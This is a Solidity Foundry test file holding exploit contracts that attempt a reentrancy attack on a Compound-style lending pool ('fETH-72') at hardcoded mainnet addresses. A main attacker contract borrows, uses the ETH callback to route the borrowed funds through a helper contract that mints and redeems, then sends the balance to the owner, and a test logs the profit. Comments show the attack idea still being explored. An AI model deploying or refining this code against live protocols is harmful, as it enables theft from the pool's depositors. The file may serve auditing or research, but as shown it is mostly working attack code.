// SPDX-License-Identifier: MIT
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface IComptroller {
    function enterMarkets(address[] calldata cTokens) external returns (uint256[] memory);
    function exitMarket(address cToken) external returns (uint256);
    function getAccountLiquidity(address account) external view returns (uint256, uint256, uint256);
}

interface ICEther {
    function mint() external payable;
    function borrow(uint256 borrowAmount) external returns (uint256);
    function repayBorrow() external payable;
    function redeem(uint256 redeemTokens) external returns (uint256);
    function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
    function getCash() external view returns (uint256);
    function totalBorrows() external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function totalReserves() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
    function borrowBalanceStored(address) external view returns (uint256);
    function exchangeRateStored() external view returns (uint256);
    function liquidateBorrow(address borrower) external payable;
    function transfer(address dst, uint256 amount) external returns (bool);
}

/// @dev During reentrancy, contract B liquidates contract A's "non-existent" borrow
/// Since borrowBalance isn't updated yet, A has 0 debt. But can we create a state
/// where A appears liquidatable?
contract Pool72LiquidationExploit {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    bool borrowInFlight;
    bool reentered;

    constructor(address payable _owner) {
        owner = _owner;
    }

    function attack() external payable {
        uint256 cash = FETH72.getCash();
        console.log("Pool cash:", cash);

        // Deposit ETH as collateral
        FETH72.mint{value: msg.value}();

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        // Borrow max allowed
        (,uint256 liq,) = COMPTROLLER.getAccountLiquidity(address(this));
        uint256 borrowAmt = liq > cash ? cash - 1 : liq;
        if (borrowAmt > 1 ether) {
            // Need at least 1 ETH due to minBorrow
            borrowInFlight = true;
            uint256 result = FETH72.borrow(borrowAmt);
            borrowInFlight = false;
            console.log("Borrow result:", result);
            console.log("Reentered:", reentered);
        }

        // After borrow, repay and redeem
        uint256 debt = FETH72.borrowBalanceStored(address(this));
        if (debt > 0) {
            FETH72.repayBorrow{value: debt}();
        }
        uint256 cTokens = FETH72.balanceOf(address(this));
        if (cTokens > 0) {
            FETH72.redeem(cTokens);
        }

        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;
        console.log("=== REENTRANCY ===");
        console.log("ETH received:", msg.value);

        // During reentrancy, borrow balance is not yet recorded
        // We have the borrowed ETH. Can we do anything useful?

        // Idea: Mint AGAIN with the borrowed ETH (increasing our cToken balance)
        // This won't work because mint has reentrancy guard

        // Idea: Send ETH to a helper contract that does something
        // Helper.doSomething{value: msg.value}();
    }
}

/// @dev Approach: Use the borrowed ETH to mint more cTokens in a helper contract
/// The helper is a separate entity, so it doesn't hit the reentrancy guard
contract Pool72HelperMintAttack {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable public immutable mainAttacker;
    address payable public immutable owner;

    constructor(address payable _mainAttacker, address payable _owner) {
        mainAttacker = _mainAttacker;
        owner = _owner;
    }

    function mintAndRedeem() external payable {
        // Mint fETH-72 with received ETH
        FETH72.mint{value: msg.value}();
        uint256 cTokens = FETH72.balanceOf(address(this));
        console.log("Helper minted cTokens:", cTokens);

        // Redeem immediately (no borrow, so no collateral needed)
        uint256 result = FETH72.redeem(cTokens);
        console.log("Helper redeem result:", result);
        console.log("Helper ETH after redeem:", address(this).balance);

        // Return ETH to main attacker
        (bool ok,) = mainAttacker.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {}
}

contract Pool72MainAttacker {
    IComptroller constant COMPTROLLER = IComptroller(0xDcc615Ba569e60c7eD31B74686624fC1770bdD9A);
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    address payable immutable owner;
    Pool72HelperMintAttack public helper;
    bool borrowInFlight;
    bool reentered;

    constructor(address payable _owner) {
        owner = _owner;
        helper = new Pool72HelperMintAttack(payable(address(this)), _owner);
    }

    function attack() external payable {
        uint256 cash = FETH72.getCash();
        console.log("Pool cash:", cash);

        // Deposit ETH
        FETH72.mint{value: msg.value}();
        console.log("Main cTokens:", FETH72.balanceOf(address(this)));

        address[] memory markets = new address[](1);
        markets[0] = address(FETH72);
        COMPTROLLER.enterMarkets(markets);

        (,uint256 liq,) = COMPTROLLER.getAccountLiquidity(address(this));
        console.log("Liquidity:", liq);

        uint256 borrowAmt = liq > cash - 1 ? cash - 1 : liq;
        console.log("Borrow amount:", borrowAmt);

        borrowInFlight = true;
        uint256 result = FETH72.borrow(borrowAmt);
        borrowInFlight = false;
        console.log("Borrow result:", result);
        console.log("Reentered:", reentered);

        // Repay borrow
        uint256 debt = FETH72.borrowBalanceStored(address(this));
        console.log("Debt:", debt);
        if (debt > 0 && address(this).balance >= debt) {
            FETH72.repayBorrow{value: debt}();
        }

        // Redeem our cTokens
        uint256 cTokens = FETH72.balanceOf(address(this));
        if (cTokens > 0) {
            // First exit market
            COMPTROLLER.exitMarket(address(FETH72));
            FETH72.redeem(cTokens);
        }

        console.log("Final balance:", address(this).balance);
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok);
    }

    receive() external payable {
        if (!borrowInFlight || reentered) return;
        reentered = true;
        console.log("=== MAIN REENTRANCY ===");
        console.log("ETH received:", msg.value);

        // During reentrancy: our borrow is NOT recorded yet in storage
        // Send the borrowed ETH to helper, which mints and redeems
        // The mint increases fETH-72's cash (restoring it)
        // The redeem takes the same amount back
        // Net effect: helper breaks even, but the exchange rate changes
        // Actually this doesn't help...

        // BUT: what if the helper mints fETH-72, and the MAIN contract's
        // collateral is now worth more because exchange rate changes?
        // No, exchange rate = (cash + borrows - reserves) / supply
        // Helper mint: cash += X, supply += X/exchangeRate
        // This doesn't change the exchange rate.

        // Different idea: During reentrancy, the MAIN's borrow balance is 0.
        // We can call exitMarket on the MAIN... but that asserts.
        // We can't call redeem (reentrancy guard).
        // We can't call transfer (reentrancy guard).

        // What CAN we do during reentrancy on a DIFFERENT contract?
        // Helper can: mint, borrow, redeem, transfer on fETH-72
        // Because the reentrancy guard is per-contract? No, it's per-comptroller.
        // Let's check: can the helper mint?

        console.log("Trying helper mint...");
        try helper.mintAndRedeem{value: msg.value}() {
            console.log("Helper succeeded!");
        } catch Error(string memory reason) {
            console.log("Helper failed:", reason);
        } catch {
            console.log("Helper failed (no reason)");
        }
    }
}

contract Pool72Test5 is Test {
    ICEther constant FETH72 = ICEther(0x8Ea8Fcd938D45D2461e023b96044Acab4780F07b);

    function testHelperMint() public {
        address payable attacker = payable(address(0xBEEF));
        vm.deal(attacker, 500 ether);

        vm.startPrank(attacker);
        Pool72MainAttacker a = new Pool72MainAttacker(attacker);

        uint256 balBefore = attacker.balance;
        a.attack{value: 200 ether}();
        uint256 balAfter = attacker.balance;

        console.log("Balance before:", balBefore);
        console.log("Balance after:", balAfter);
        if (balAfter > balBefore) {
            console.log("PROFIT:", balAfter - balBefore);
        } else {
            console.log("LOSS:", balBefore - balAfter);
        }
        vm.stopPrank();
    }
}
